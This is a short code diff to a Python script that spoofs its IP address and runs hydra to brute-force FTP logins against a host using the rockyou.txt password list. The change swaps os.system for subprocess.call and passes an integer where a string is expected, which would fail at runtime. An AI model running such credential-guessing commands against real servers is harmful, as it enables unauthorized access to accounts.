@@ -12,6 +12,7 @@ import random
 import ftplib
 from ftplib import FTP
 from time import sleep
+import subprocess
 import socket, struct, fcntl
 
 __author__ = "Caleb Whitman"
@@ -66,7 +67,7 @@ def LogIn(host,user):
         ip (string): attackers ip"""
 def attack(host,user,ip):
     setIpAddr('eth0', ip)  # Change the ip address the user is on
-    os.system("timeout 20 hydra -V "+host+" ftp -l "+user.strip('\n\t\r ')+" -P rockyou.txt")
+    subprocess.call(["timeout",20,"hydra","-V",host,"ftp","-l",user.strip('\n\t\r '),"-P", "rockyou.txt"])
     sleep(random.randint(1, 5))  #Let the attack run.
 
 
